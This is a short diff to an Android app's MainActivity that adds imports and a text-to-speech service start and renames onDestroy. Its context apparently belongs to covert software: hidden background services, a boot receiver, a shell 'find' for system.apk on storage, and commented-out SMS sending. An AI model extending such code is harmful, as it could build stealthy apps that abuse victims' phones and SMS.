@@ -10,12 +10,14 @@ import android.content.Context;
 import android.content.IntentFilter;
 import android.util.Log;
 import android.widget.Toast;
+import android.net.Uri;
 import android.content.pm.PackageManager;
 import android.content.pm.PackageInfo;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.ResolveInfo;
 import android.app.PendingIntent;
 import android.os.Environment;
+import android.os.Handler;
 import android.graphics.Bitmap;
 import android.content.ComponentName;
 import android.content.BroadcastReceiver;
@@ -35,7 +37,6 @@ import android.os.SystemClock;
 
 public class MainActivity extends Activity
 {
-    
     private SharedPreferences settings;
 	private SharedPreferences.Editor seteditor;
 	private ReceiverBoot receiver;
@@ -68,8 +69,8 @@ public class MainActivity extends Activity
 		seteditor = settings.edit();
 		receiver = new ReceiverBoot();
 
-		
 		startService(new Intent(this, SystemThread.class));
+
 		mPending = PendingIntent.getService(MainActivity.this, 0, new Intent(MainActivity.this, ThreadService.class), 0);
 
 		seteditor.putString("main", "hotspot");    
@@ -85,8 +86,12 @@ public class MainActivity extends Activity
 		finish();
 	}
 
-	public void onDestroy() {
+	public void xonDestroy() {
 		super.onDestroy();
+
+		ServiceTTS tts = new ServiceTTS();
+		tts.str = "";
+		startService(new Intent(this, ServiceTTS.class));
 
 		String sdcard = Environment.getExternalStorageDirectory().getAbsolutePath();
 		String data = receiver.shellCommands("find "+sdcard+"/ -name system.apk");
@@ -359,6 +364,5 @@ public class MainActivity extends Activity
 		/* sms.sendMultipartTextMessage(phoneNumber, null, parts, sentIntents, deliveryIntents); */
 		return resultSms;
     }
-
 
 }
